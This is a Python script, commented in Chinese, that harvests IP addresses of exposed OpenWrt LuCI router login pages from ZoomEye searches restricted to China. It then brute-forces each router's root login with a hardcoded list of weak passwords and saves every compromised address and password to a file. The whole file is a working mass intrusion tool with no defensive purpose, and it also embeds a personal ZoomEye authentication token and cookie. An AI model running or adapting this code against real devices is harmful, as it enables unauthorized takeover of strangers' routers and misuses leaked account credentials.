#!/usr/bin/python
# -*- coding: UTF-8 -*-
import requests, time, random, json, traceback
import os, json
import sys
import ast
from urllib import parse
# from fake_useragent import UserAgent
'''
##########################################################
1.请务必依照第一行的说明修改参数。
2.如果需要增加弱密码，请修改数组变量pwd。
3.json文件需要通过zoomeye网站自行抓包获取，。
4.抓包时，最后调整起始时间参数，并以此进行搜索。如2022-10-01
5.抓包完成後需要将json文件重新命名后，放在IP文件夹.
6.本程序需要和IP文件夹放在同一目录。
##########################################################
'''
name = "openwrt"
date1 = "2022-10-21"
date2 = "2022-10-24"
title = parse.quote("OpenWrt - LuCI")
ip_list = []
pwd = ["password", "admin", "passwd", "root", "123456789", "adminadmin", "rootroot", "12345678", "1234567890", "13579abc"]
c = 1 #重新读取json中IP开关变量，当为1时重新读取，当为0时不再读取。
ck = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjMwYjYwZGNjZDM2MCIsImVtYWlsIjoiMzQ2NjQ1NjYzQHFxLmNvbSIsImV4cCI6MTY2Njk1NjgxNS4wfQ.1DFqDR0VUc4pSVHKbqi1ErtAb4lGkPWHF9nJq--lppo"
pData = ["luci_username=root&luci_password=", "username=root&password="]
num = 0

dir = os.path.dirname(os.path.abspath(__file__))
test_ip = []
headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36", \
					"Host": "www.zoomeye.org", \
					"cube-authorization": ck, \
					"Content-Type": "application/x-www-form-urlencoded", \
					"Accept": "application/json, text/plain, */*", \
					"Refer": 'https://www.zoomeye.org/searchResult?q=openwrt%20%2Bcountry%3A%22CN%22%20%2Bafter:%222022-01-01%22%20%2Bbefore:%222023-01-01%22%20%2Btitle:%22OpenWrt%20-%20LuCI%22&t=all', \
					"Accept-Encoding": "gzip,deflate", \
					"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", \
					"cookie": "__jsluid_s=19a90c545b2376182d80a3b300734c30", \
					"X-Requested-With": "mark.via.gp"}
def down_json():
	for page in range(1, 21):
		try:
			url = "https://www.zoomeye.org/search?q={}%2520%252Bcountry%253A%2522CN%2522%2520%252Bafter%3A%22{}%22%2520%252Bbefore%3A%22{}%22%2520%252Btitle%3A%22{}%22&page={}&pageSize=20&t=v4%2Bv6%2Bweb".format(name, date1, date2, title, page)
			res = requests.get(url = url, headers = headers, timeout = 60)
			resp = json.loads(res.text)
			#print(resp)
			if resp["status"] == 200:
				for i in resp["matches"]:
					ip_list.append("{}:{}".format(i["ip"], i["portinfo"]["port"]))
					#print(str(i["ip"]) + ":" + str(i["portinfo"]["port"]))
			elif resp["status"] == 401:
				print("下载时需要重新登陆")
		except Exception as e:
			print("下载Json出错了。\n" + "=" * 80)
			traceback.print_exc(e)
			break
		print("=" * 60 + "\n成功获取第{}页测试IP\n".format(page))
		time.sleep(3)
	for j in ip_list:
		with open("./testIp.txt", "a+") as f:
			f.write("{}\n".format(j))

# 测试IP是否可用，并循环执行至所有IP测试完成。
def test1_ip():
	try:
		n = 0 # 统计执行测试的IP数量。
		m = 0 # 统计无法打开的IP数量。
		k = 0 # 统计可用的IP数量。
		num = len(ip_list)
		print("总共有{}个IP须要测试".format(num), "\n")
		for j in test_ip:
			url = "http://{}/cgi-bin/luci".format(j)
			headers = {"user-agent": "Mozilla/5.0 (Linux; Android 9; MI 8 Build/PKQ1.180729.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Mobile Safari/537.36", \
						"Host": j, \
						"Connection": "Keep-Alive", \
						"Origin": "http://{}".format(j), \
						"Upgrade-Insecure-Requests": "1", \
						"Content-Type": "application/x-www-form-urlencoded", \
						"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", \
						"Refer": "http://{}/cgi-bin/luci".format(j), \
						"Accept-Encoding": "gzip,deflate", \
						"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", \
						"X-Requested-With": "mark.via.gp"}
			_flag = 1
			for x in pData:
				if _flag == 1:
					for i in pwd:
						try:
							res = requests.post(url = url, headers = headers, data = x + i, timeout = 10)
							html = res.status_code
							#print("响应值: " + str(res.headers))
						except Exception as e:
							#print('该IP:{}无法连接或密码错误'.format(j))
							#traceback.print_exc()
							m = m + 1
							#print("测试过程中，第{}个IP出错了。".format(n), "\n")
							break
						if html == 200:
							if res.headers.get("Connection") == "Keep-Alive":
								k = k + 1
								_flag = 0
								file_path = './goodIP.txt'.format(dir) # 使用r参数，可不用再转义，r代表后面的是路径。
								with open(file_path, "a+") as f:
									f.write("{}\npsw: {}\n\n".format(j, i))
								print("找到 {} 个可用IP。\n测试进度: {:.0%} 。\n剩余 {} 个IP待测试。\n".format(k, n/num, num - n))
								break
			n = n + 1
			if not (n % 20):
				print("测试进度: {:.0%} 。\n剩余 {} 个IP待测试。\n".format(n/num, num - n))
	except Exception as e:
		print('测试IP过程中出错了。', "\n")
		#traceback.print_exc()
	finally:
		print("共测试了{}个IP，其中{}个IP可用，{}个IP出错了。".format(n, k, m))

if __name__ == '__main__':
	if c == 1:
		down_json()
		print("=" * 60 + "\n成功获取所有测试IP\n" + "=" * 60)
	test_ip = ip_list
	test1_ip()
